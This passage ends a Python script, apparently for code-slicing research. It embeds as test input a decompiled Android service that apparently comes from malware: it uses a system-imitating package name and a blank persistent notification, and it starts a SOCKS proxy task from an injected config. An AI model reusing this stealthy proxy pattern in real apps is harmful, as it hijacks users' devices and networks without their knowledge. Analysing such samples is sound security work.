                        } catch (InterruptedException e2) {
                        }
                    }
                } catch (Exception e3) {
                    b.a("catch works");
                    SS.this.a("Exception");
                }
            }
        }).start();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean d() {
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) getSystemService("connectivity")).getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();
    }

    private void e() {
        new a().execute(new Integer[0]);
    }

    @SuppressLint({"NewApi"})
    private void f() {
        Notification build;
        Intent intent = new Intent(this, (Class<?>) android.system.sa.a.class);
        intent.setAction("socks");
        intent.setFlags(268468224);
        PendingIntent activity = PendingIntent.getActivity(this, 0, intent, 0);
        try {
            Bitmap b = b(this.e.getString("icon"));
            if (b != null) {
                b.a("icon != null");
                build = Build.VERSION.SDK_INT >= 16 ? new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build() : new Notification.Builder(this).setContentTitle("").setContentText("").setLargeIcon(Bitmap.createScaledBitmap(b, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();
            } else {
                b.a("icon = null");
                build = Build.VERSION.SDK_INT >= 16 ? new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).build() : new Notification.Builder(this).setContentTitle("").setContentText("").setContentIntent(activity).setOngoing(true).getNotification();
            }
            startForeground(101, build);
        } catch (Exception e) {
            b.a(e.toString());
            android.system.f.a.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.b = (PowerManager) getSystemService("power");
    }

    @Override // android.app.Service
    public void onDestroy() {
        a("onDestroy");
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        this.a = this;
        try {
            this.e = new JSONObject(intent.getExtras().getString("socks"));
        } catch (Exception e) {
            android.system.f.a.a(this.a, "exit", e.toString());
            stopSelf();
            System.exit(0);
        }
        try {
            a();
            f();
            b.a("startExitThread");
            c();
            b.a("startSocksAsyncTask");
            e();
            return 2;
        } catch (Exception e2) {
            b.a(e2.toString());
            android.system.f.a.a(this.a, "exit", e2.toString());
            stopSelf();
            System.exit(0);
            return 2;
        }
    }
}
'''


# ============================================================
# TEST
# ============================================================

if __name__ == "__main__":

    smart_slice_poc(
        class_source=DUMMY_CLASS,
        keep_ratio=0.30,
        max_tokens=512,
        top_k_ratio=0.12,
        min_seeds=4,
        backward_depth=6,
        forward_depth=6,
        use_attention_fusion=True,
    )